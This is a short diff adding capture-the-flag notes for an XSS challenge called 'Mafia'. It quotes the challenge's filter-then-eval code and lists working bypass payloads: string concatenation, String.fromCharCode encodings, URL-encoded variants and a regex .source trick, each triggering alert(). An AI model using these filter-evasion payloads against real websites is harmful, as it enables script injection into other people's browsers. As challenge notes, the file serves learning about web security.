@@ -1,0 +1,18 @@
+Mafia
+
+/* Challenge */
+mafia = (new URL(location).searchParams.get('mafia') || '1+1')
+mafia = mafia.slice(0, 50)
+mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')
+mafia = mafia.replace(/alert/g, '_')
+eval(mafia)
+
+eval('al'.concat('ert(123)'))
+http://localhost:8000/test.html?mafia=
+
+String.fromCharCode(97,108,101,114,116,40,49,41)
+eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,52,41))
+String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29
+
+/ALERT(1337)/.source.toLowerCase()
+%2FALERT%281337%29%2F.source.toLowerCase%28%29
